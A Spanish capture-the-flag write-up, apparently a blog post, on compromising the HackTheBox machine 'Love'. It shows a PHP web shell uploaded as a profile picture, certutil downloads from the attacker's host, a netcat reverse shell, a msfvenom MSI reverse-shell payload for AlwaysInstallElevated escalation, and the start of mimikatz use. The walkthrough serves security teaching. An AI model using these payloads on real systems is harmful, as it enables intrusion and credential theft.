---
layout      : post
title       : "HackTheBox - Love"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344banner.png
category    : [ htb ]
tags        : [ MSI, registers, file-upload, AlwaysInstallElevated, SSRF ]
---
Máquina **Windows** nivel fácil, escanearemos archivos locales (**localhost**) en busca de malware e.e Encontraremos credenciales y generaremos votantes con fotos de perfil peligrosas... Jugaremos con registros e instalaremos paquetes **MSI** algo traviesos.

![344loveHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344loveHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [pwnmeow](https://www.hackthebox.eu/profile/157669).

Caminos para caminantes con caminos caminantes e.e

Nos enfrentaremos a un servicio web con dos logins, uno de ellos nos permite jugar con usuarios y contraseñas, enumerando un dominio distinto al default, llegamos a una web que escanea archivos en búsqueda de malware, el archivo se lo debemos pasar por medio de una **URL**, jugaremos con esto para ver recursos locales (`http://localhost`) a los que externamente no tenemos acceso, en esa labor lograremos enumerar un servicio web alojado en el puerto **5000** (`http://localhost:5000`), de él encontraremos unas credenciales para un usuario llamado **admin**, las usaremos contra uno de los login y entraremos a una plataforma que administra un sistema de votaciones...

Estando dentro podremos agregar **votantes**, a cada votante se le puede adjuntar una imagen de perfil, usaremos esto para agregar un objeto `.php` que nos permita ejecutar código remotamente, mediante él lograremos una **Reverse Shell** como el usuario `phoebe` en la máquina.

***Hice un script que nos crea el votante, ejecuta comandos en el sistema y hace como si no hubiera pasado nada e.e***

> [arbitrary_up_RCE.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/love/arbitrary_up_RCE.py).

Estando dentro nos apoyaremos de varias guías sobre **PrivEsc Windows** para encontrar un tipo de escalada llamada **AlwaysInstallElevated**, tendremos que jugar con 2 registros del sistema y validar si están habilitados, en caso de que lo estén podremos instalar paquetes `MSI` con permisos administrativos. Veremos que lo están, así que generaremos un paquete **MSI** malicioso con ayuda de `msfvenom` que una vez se esté instalando nos genere una **Reverse Shell**. Con esto lograremos una Shell como el usuario `NT AUTHORITY SYSTEM` (diosito) en el sistema.

***Yyyy un `autopwn`, con él conseguimos una Shell en el mismo script como el usuario `administrador` del sistema.***

> [autopwnLove.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/love/autopwnLove.py).

Basta, a rompernos la cara!! e.e

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Más o menos de todo, intenta jugar con vulns conocidas, pero es bastante juguetona.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

Es momento de diversificar los distintos pensamientos...

1. [Reconocimiento](#reconocimiento).
  * [Escaneo de puertos con **nmap**](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Enumeración servidor web - puerto 80](#puerto-80).
  * [Enumeración certificado web - puerto 443](#puerto-443).
3. [Explotación](#explotacion).
  * [Encontrando credenciales del usuario **admin** contra un login web](#enum-creds-admin).
  * [RCE mediante una subida aleatoria de archivos - usuario **Phoebe**](#rce-php-file).
  * [Obtención de credenciales usuario **Phoebe** para generar una Shell estable con **evil-winrm**](#phoebe-evilrm).
4. [Escalada de privilegios](#escalada-de-privilegios).
5. [Post PrivEsc - Usamos **mimikatz** para extraer hashes **NTLM** y hacer *passthehash*](#post-privesc-ntlm-hashes).
  * [Pass-The-Hash - evil-winrm](#post-privesc-pth-winrm).
  * [Pass-The-Hash - psexec.py](#post-privesc-pth-psexec).

...

## Reconocimiento [#](#reconocimiento) {#reconocimiento}

---

### Enumeración de puertos con **nmap** [🔗](#enum-nmap) {#enum-nmap}

Como siempre iniciaremos escaneando los puertos abiertos de la máquina, así empezaremos a encaminar nuestra investigación:

```bash
❱ nmap -p- --open -v 10.10.10.239 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

El escaneo nos devuelve:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Mon Jun 21 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.239
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.239 ()	Status: Up
Host: 10.10.10.239 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 5000/open/tcp//upnp///, 5040/open/tcp//unknown///, 5985/open/tcp//wsman///, 5986/open/tcp//wsmans///, 7680/open/tcp//pando-pub///, 49664/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////, 49670/open/tcp/////
# Nmap done at Mon Jun 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 85.24 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Servidor web |
| 135    | **[RPC](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)**: Permite la comunicación entre programas |
| 139    | **[SMB](https://www.varonis.com/blog/smb-port/)**: Ayuda a la transferencia de archivos en la red |
| 443    | **[HTTPS](https://es.wikipedia.org/wiki/Protocolo_seguro_de_transferencia_de_hipertexto)**: Servicio web "seguro" |
| 445    | **[SMB](https://www.varonis.com/blog/smb-port/)**: Ayuda a la transferencia de archivos en la red |
| 3306   | **[MySQL](https://neoattack.com/neowiki/mysql/)**: Servidor de bases de datos |
| 5000   | No lo sabemos aún con certeza |
| 5985   | **[WinRM](https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/)**: Permite realizar tareas administrativas remotamente |
| 5986   | **[WinRM (HTTPS)](https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/)**: Permite realizar tareas administrativas remotamente |
| 7680   | No lo sabemos a ciencia cierta |
| 5040,49664,49666,49667 | Desconocidos |
| 49668,49669,49670      | Desconocidos |

Bastantes puertos, ahora juntando todos los servicios activos vamos a hacer otro escaneo, pero este para obtener las versiones de cada servicio y si existen scripts relacionados con ellos:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.239
    [*] Open ports: 80,135,139,443,445,3306,5000,5040,5985,5986,7680,49664,49666,49667,49668,49669,49670

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680,49664,49666,49667,49668,49669,49670 -sC -sV 10.10.10.239 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

En este caso obtenemos:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Mon Jun 21 25:25:25 2021 as: nmap -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680,49664,49666,49667,49668,49669,49670 -sC -sV -oN portScan 10.10.10.239
Nmap scan report for 10.10.10.239
Host is up (0.11s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, NULL, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|_    Host '10.10.14.103' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-06-21T16:28:22+00:00; +25m20s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
49664/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=6/21%Time=60D0B785%P=x86_64-pc-linux-gnu%r(NU
...
...
...
...x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h10m20s, deviation: 3h30m02s, median: 25m19s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-21T09:28:08-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-21T16:28:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 182.94 seconds
```

Tenemos algunas cositas relevantes:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Apache httpd 2.4.46 OpenSSL/1.1.1j PHP/7.3.27 |
| 443    | HTTPS    | Apache httpd 2.4.46 OpenSSL/1.1.1j PHP/7.3.27 |

* Además de un dominio: `staging.love.htb`.
* Y un nombre de organización: `ValentineCorp`.

---

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 445    | SMB      | Windows 10 Pro 19042 |
| 5000   | HTTP     | Servidor web con Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |

Listones, hemos terminado nuestra enumeración con **nmap**, ahora profundicemos en cada servicio y veamos en cuál tenemos posibilidad de romper cositas...

...

## Enumeración [#](#enumeracion) {#enumeracion}

---

### Puerto 80 [🔗](#puerto-80) {#puerto-80}

![344page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80.png)

Un login... Intentando distintos ID's nos responde con esto:

> Cannot find voter with the ID

Así que podríamos intentar algún tipo de fuerza bruta para encontrar si algún **ID** nos devuelve una respuesta distinta, peeero antes, podemos probar a agregar el dominio que encontramos en el escaneo de **nmap** al archivo `/etc/hosts` y ver si nos responde algo al hacer peticiones hacia él:

```bash
❱ cat /etc/hosts
...
10.10.10.239  staging.love.htb
...
```

> [¿Que es el archivo **hosts**?](https://www.ionos.es/digitalguide/servidores/configuracion/archivo-hosts/).

Y ahora en la web pondríamos el dominio:

![344page80staging](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging.png)

Perfecto, tenemos otro servicio que esta respondiendo contra ese dominio, así que ahora tenemos más para probar... **(Lo del fuzzeo por ID's no nos dio ninguna respuesta, así que F)**

Se trata de un servidor web en producción aún que se encarga de analizar archivos en busca de malware y cositas así, dirigiéndonos al apartado **Demo** (arriba a la izquierda) nos lleva a `/beta.php`:

![344page80staging_betaPHP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging_betaPHP.png)

En él podemos añadir un archivo mediante una **URL** y la web hará el respectivo escaneo del objeto en busca de malware...

Después de jugar con este apartado no logramos nada interesante (ni **reverse shells**, ni archivos `.php` con instrucciones simples (`echo 'hola';`), ni `.exe`'s, nada de eso nos funcionó), peeero sabemos que esta funcionando y que además algunos archivos `.php` los interpreta, ¿cómo lo sabemos?, sencillito... 

Escaneamos el archivo `index.php` del servidor local, que sería el correspondiente a `http://10.10.10.239/index.php`:

![344page80staging_betaPHP_localhost](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging_betaPHP_localhost.png)

Y nos responde con su **body**:

![344page80staging_betaPHP_localhost_res](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging_betaPHP_localhost_res.png)

Pero poquito poquito podemos hacer con esto...

Jugando con `dirsearch` y `wfuzz` para realizar un fuzzeo en la web principal (`http://10.10.10.239`) encontramos varios recursos más, pero solo algunos interesantes (y a los que tenemos acceso):

```bash
❱ wfuzz -c --hc=404,403 -w /opt/SecLists/Discovery/Web-Content/common.txt http://10.10.10.239/FUZZ
```

![344bash_fuzz_page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_fuzz_page80.png)

Visitando `/admin` obtenemos otro login, pero ahora nos pide usuario y contraseña... 

![344page80_admin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin.png)

Probando con los de siempre, nos damos cuenta de que al colocar cualquier cosa en el campo **Username**, nos responde con:

> Cannot find account with the username

Pero al colocar el usuario **admin** nos devuelve:

> Incorrect password

Así que sabemos que el usuario **admin** existe en la base de datos (:

Visitando el recurso `/includes` vemos una lista de archivos:

![344page80_includes_list](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_includes_list.png)

Dando clic en `navbar.php` encontramos un error, y en ese error la ruta absoluta donde esta alojado el servidor web:

![344page80_includes_navbar](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_includes_navbar.png)

No podemos hacer nada con esto, peeeeeero puede llegar a ser importante en caso de querer subir archivos o algo así. Guardao'...

...

### Puerto 443 [🔗](#puerto-443) {#puerto-443}

Después de nuestra enumeración con el puerto 80, nos pondremos a enumerar el servicio **HTTPS**, colocando en el navegador `https://10.10.10.239` nos responde que no tenemos acceso a ese recurso :( Peeero podemos apoyarnos de `openssl` para ver información del certificado **SSL** con el que se cuenta:

```bash
❱ openssl s_client -connect 10.10.10.239:443
```

Al ejecutarlo podemos destacar el dominio que ya habíamos visto con **nmap**, pero también un **email**:

```bash
...
depth=0 C = in, ST = m, L = norway, O = ValentineCorp, OU = love.htb, CN = staging.love.htb, emailAddress = roy@love.htb
...
```

Bien, podemos extraer el usuario `roy` del email...

Probando con él ante **SMB** y ante los demás recursos no logramos alguna otra respuesta a las que teníamos, pero bueno, guardémoslo por si algo (:

...

## Explotación [#](#explotacion) {#explotacion}

---

### Encontrando credenciales del usuario <u>admin</u>, login web [🔗](#enum-creds-admin) {#enum-creds-admin}

Después de un tiempo de estar perdido y sin esperanzas e.e 

Estuvimos jugando con los demás puertos activos, nos dimos cuenta de que al realizar peticiones hacia la `http://10.10.10.239:5000` volvíamos a recibir:

> You don't have permission to access this resource.

Acá recordé lo que habíamos hecho con el analizador de archivos (que habíamos escaneado un objeto **local**), intentando en vez de escanear el `index.php`, hacerlo contra el `index.php` pero del servidor **web** alojado en el puerto **5000** (que ni idea si exista), curiosamente obtenemos una respuesta:

![344page80staging_betaPHP_localhost5000](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging_betaPHP_localhost5000.png)

![344page80staging_betaPHP_localhost5000_res](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80staging_betaPHP_localhost5000_res.png)

Encontramos que el servicio del puerto **5000** es uno relacionado con **passwords** yyy vemos una para el usuario **admin** (que sabíamos que existía), pues probémoslas:

* Username: `admin`.
* Password: `@LoveIsInTheAir!!!!`.

![344page80_admin_login_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin_login_done.png)

Listones, son válidas 🤼

---

### RCE mediante una subida aleatoria de archivos [🔗](#rce-php-file) {#rce-php-file}

Jugando nos damos cuenta de que podemos agregar **votantes**

![344page80_admin_addvoters](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin_addvoters.png)

Damos clic en **New** y vemos:

![344page80_admin_addvoters_form](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin_addvoters_form.png)

Podemos añadir una imagen de perfil 😏 pues en vez de una imagen, intentemos subir un archivo `.php` con código que nos permita ejecutar comandos en el sistema:

```bash
❱ cat quesedice.php 
<?php $command=shell_exec($_GET['xmd']); echo $command; ?>
```

Lo que reciba la variable `xmd` a través del método [**GET**](https://www.ionos.es/digitalguide/paginas-web/desarrollo-web/get-vs-post/), será ejecutado en el sistema (gracias a la función `shell_exec()`, pero podríamos usar `system()`, `exec()` y otras más), el resultado de la ejecución se guarda en la variable `command` y mostrado en pantalla con ayuda de `echo`. Por ejemplo, si somos el usuario **web** y hacemos `xmd=whoami`, se ejecutara `whoami` en el sistema y guardara **web** en la variable `command`, lo siguiente será ver ese resultado con el `echo $command`.

Nuestro formulario quedaría así (en mi caso):

![344page80_admin_addvoters_form_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin_addvoters_form.png)

Guardamos y:

![344page80_admin_addvoters_lanz](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_admin_addvoters_lanz.png)

Vemos el icono de la imagen en todo el centro, la arrastramos (como si quisiéramos abrirla en otra ventana) y nos redirige a la URL `http://10.10.10.239/images/quesedice.php`:

![344page80_images_quesedicePHP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_images_quesedicePHP.png)

Al parecer esta interpretando el código, solo que `shell_exec` esta vacío y nos muestra ese error, juguemos con el método **GET** para ejecutar el comando `whoami`:

```html
http://10.10.10.239/images/quesedice.php?xmd=whoami
```

Obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_images_quesedicePHP_whoami.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opa, tenemos ejecución remota de comandos (: El usuario que esta ejecutando el servidor web se llama `phoebe`, por lo tanto vamos a estar ejecutando comandos como ese usuario (:

**Ya confirmamos *RCE*, ahora entablémonos una Reverse Shell:**

Podemos descargar el binario `nc.exe` desde [acá](https://eternallybored.org/misc/netcat/) (netcat 1.12), una vez los tengamos en nuestro sistema, los movemos o nos movemos donde estén los binarios y levantamos un servidor web con ayuda de **Python**:

```bash
❱ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ahora procedemos a indicarle a la máquina que se descargue el binario `nc.exe` y lo guarde en su sistema:

```html
http://10.10.10.239/images/quesedice.php?xmd=certutil.exe -f -split -urlcache http://10.10.14.103:8000/nc.exe c:\\Users\\phoebe\\Videos\\nc.exe
```

Guardamos el binario en la carpeta **Videos** del usuario **phoebe**... La web nos responde:

```html
**** Online **** 0000 ... 96d8 CertUtil: -URLCache command completed successfully. 
```

Validamos que se haya descargado y exista en el sistema:

```html
http://10.10.10.239/images/quesedice.php?xmd=dir c:\Users\phoebe\Videos\nc.exe
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344page80_images_quesedicePHP_dir_videos.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones, ahora simplemente le indicamos que una vez entable una conexión con el puerto **4433** de nuestra máquina nos lance por ahí una `cmd.exe` (una terminal de **Windows**).

**Pero claro, antes tenemos que ponernos en escucha por el puerto **4433**:

```bash
❱ nc -lvp 4433
listening on [any] 4433 ...
```

Ahora sí, procedamos:

```html
http://10.10.10.239/images/quesedice.php?xmd=c:\Users\phoebe\Videos\nc.exe 10.10.14.103 4433 -e cmd.exe
```

YyyyyYyaysdfyyayyYYYYyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_nc_phoebe_RevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344google_gif_yeahslowgolf.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>

Peeeeeeeeerfecto, tamos con una terminal en el sistema como el usuario **phoebe**.

...

He creado un script para facilitar la ejecución remota de comandos, solo debemos pasarle el **comando** y no debemos preocuparnos de nada más (:

> [arbitrary_up_RCE.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/love/arbitrary_up_RCE.py).

...

### Obtención PowerShell estable con evil-winrm [🔗](#phoebe-evilrm) {#phoebe-evilrm}

Enumerando el sistema y la raíz del servidor web, encontramos el archivo que hace la conexión con la base de datos:

```powershell
c:\\xampp\htdocs\omrs\includes>type conn.php
```

```php
<?php
        $conn = new mysqli('localhost', 'phoebe', 'HTB#9826^(_', 'votesystem');

        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }

?>
```

Tenemos al usuario **phoebe** y su contraseña contra el servicio **MySQL**... 

Pero haciendo reutilización de contraseñas y jugando con la herramienta [evil-winrm](https://github.com/Hackplayers/evil-winrm) logramos obtener una **PowerShell** como el usuario **Phoebe** en el sistema:

```bash
❱ evil-winrm -i 10.10.10.239 -u 'phoebe' -p 'HTB#9826^(_'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_evilwinrm_phoebe.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Así que ya podemos salirnos de la **Reverse Shell** (:

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando el sistema por encima buscando formas de escalar no encontramos nada interesante, o bueno, encontramos una carpeta algo "llamativa" en la raíz del sistema:

```powershell
*Evil-WinRM* PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/21/2021   9:52 AM                Administration
...
```

Dentro hay unos objetos, pero nada que sacar de ellos, así que tamos igual...

De ahí me fui para la web y busqué algunas guías sobre **PrivEsc Windows**, llegamos a esta de [HackTricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation), allí encontramos una manera de escalar llamada [AlwaysInstallElevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated), en la cual debemos validar si dos [registros del sistema](https://es.wikipedia.org/wiki/Registro_de_Windows) están habilitados (que tengan el valor `0x1`), en caso de que lo estén tendremos la posibilidad de instalar [Microsoft Windows Installer Package Files (MSI)](https://es.wikipedia.org/wiki/Windows_Installer) (paquetes **MSI**) con permisos administrativos así no los tengamos (: pues validemos los dos registros:

```powershell
*Evil-WinRM* PS C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Bien, siguiente:

```powershell
*Evil-WinRM* PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Perfecto, entonces tenemos la posibilidad de instalar paquetes **MSI** con permisos administrativos, apoyémonos de **msfvenom** para crear un paquete malicioso que cuando intente **instalarlo** nos genere una Reverse Shell:

> [cd6629.gitbook.io - windows privesc - AlwaysInstallElevated](https://cd6629.gitbook.io/ctfwriteups/windows-privesc#alwaysinstallelevated).

**Asignamos nuestra IP y el puerto en el que estaremos escuchando...**

```bash
❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.103 LPORT=4433 -f msi -o ajaterompi.msi
```

Ejecutamos y obtenemos el paquete:

```bash
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
Saved as: ajaterompi.msi
```

Ahora, subimos el paquete a la máquina víctima y procedemos a instalarlo:

```powershell
*Evil-WinRM* PS C:\Users\Phoebe\Videos> certutil.exe -f -urlcache -split http://10.10.14.103:8000/ajaterompi.msi c:\Users\Phoebe\Videos\ajaterompi.msi
```

> **Nos ponemos en escucha por el puerto 4433: `nc -lvp 4433`**

Ahora ejecutamos:

```powershell
*Evil-WinRM* PS C:\Users\Phoebe\Videos> msiexec /quiet /qn /i c:\Users\Phoebe\Videos\ajaterompi.msi
```

Donde (gracias a [vulp3cula.gitbook.io - privesc windows - AlwaysInstallElevated setting](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-windows#alwaysinstallelevated-setting)):

* `/quiet` permite **bypassear** el **control de cuentas de usuario ([UAC](https://java.com/es/download/help/uac.html))**.
* `/qn` le indica al programa que no nos ejecute una interfaz gráfica.
* `/i` es el que le dice que queremos hacer una **instalación** de un paquete.

Listo, entendiendo que estamos haciendo, procedemos a ejecutar la línea...

Pero no pasa nada ): Acá se me ocurrió que el problema podría ser **PowerShell**, así que volviendo a usar él [script]() para ejecutar comandos en el sistema, le decimos que nos ejecute esa línea:

```bash
❱ python3 arbitrary_up_RCE.py -c 'msiexec /quiet /qn /i c:\Users\Phoebe\Videos\ajaterompi.msi'
```

Y en nuestro listener:

![344bash_script_msiexec_adminSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_script_msiexec_adminSH.png)

Obtenemos la **Reverse Shell** como el usuario administrador del sistema (:

Recopilamos lo usado:

* [HackTricks - AlwaysInstallElevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated).
* [cd6629.gitbook.io - windows privesc - AlwaysInstallElevated](https://cd6629.gitbook.io/ctfwriteups/windows-privesc#alwaysinstallelevated).
* [vulp3cula.gitbook.io - privesc windows - AlwaysInstallElevated setting](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-windows#alwaysinstallelevated-setting).

Veamos las flags...

![344flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344flags.png)

Y listones, hemos terminado la máquina, linda, lindo camino.

...

He creado un script **autopwn**:

> [AutopwnLove.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/love/autopwnLove.py).

El cual efectúa la explotación e instalación del paquete `.msi` para generarnos una Shell en el propio script, el script levantara un servidor web por 10 segundos el cual usaremos para subir el paquete a la máquina (que si no le especificas uno el programa lo crea):

![344bash_autopwn_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/love/344bash_autopwn_done.png)

---

## Post Explotación: Extracción hashes NTLM [#](#post-privesc-ntlm-hashes) {#post-privesc-ntlm-hashes}

Algo que podemos hacer es jugar con [mimikatz](https://github.com/gentilkiwi/mimikatz/wiki) (herramienta que entre muchas cosas nos ayuda a robar datos de identificación de usuarios) para extraer los hashes [**NTLM**](https://www.ionos.es/digitalguide/servidores/know-how/ntlm/) para hacer el famoso ataque **PassTheHash**:

> Este ataque consiste en capturar las passwords que se encuentran almacenadas en la memoria RAM. En realidad, no se capturan las passwords como tal, sino que se captura el hash de cada password. [Qué es Mimikatz?](https://zybersec.es/que-es-mimikatz-y-por-que-nos-tenemos-que-preocupar-si-lo-detectamos-en-nuestra-red).

> Si una persona captura el hash de la password, puede hacer exactamente lo mismo que si tuviera la password original.

Perfectisimo, pues subamos **mimikatz** a la máquina víctima, lo podemos descargar del propio [repositorio](https://github.com/gentilkiwi/mimikatz) en la parte [**Releases**](https://github.com/gentilkiwi/mimikatz/releases)...

Una vez tengamos el binario `mimikatz.exe`, lo subimos y ejecutamos:

```powershell
c:\Users\Administrator\Videos>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 31 2021 00:08:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
